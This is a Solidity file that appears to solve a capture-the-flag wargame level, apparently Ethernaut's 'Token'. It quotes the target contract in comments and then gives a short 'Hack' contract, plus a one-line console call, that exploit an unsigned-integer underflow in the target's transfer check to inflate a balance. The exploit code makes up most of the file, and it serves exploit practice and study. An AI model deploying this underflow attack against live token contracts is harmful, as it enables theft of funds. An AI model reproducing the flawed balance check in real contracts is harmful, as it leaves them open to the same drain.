// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contract Token {

//   mapping(address => uint) balances;
//   uint public totalSupply;

//   constructor(uint _initialSupply) public {
//     balances[msg.sender] = totalSupply = _initialSupply;
//   }

//   function transfer(address _to, uint _value) public returns (bool) {
//     require(balances[msg.sender] - _value >= 0);
//     balances[msg.sender] -= _value;
//     balances[_to] += _value;
//     return true;
//   }

//   function balanceOf(address _owner) public view returns (uint balance) {
//     return balances[_owner];
//   }
// }
// odometer, Overflows.

interface IToken{
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint);
}

contract Hack{
    constructor(address _addr){
        IToken(_addr).transfer(msg.sender, 1);
    }
}
// or simply 'await contract.transfer('0x0000000000000000000000000000000000000000', 21)' will cause an over flow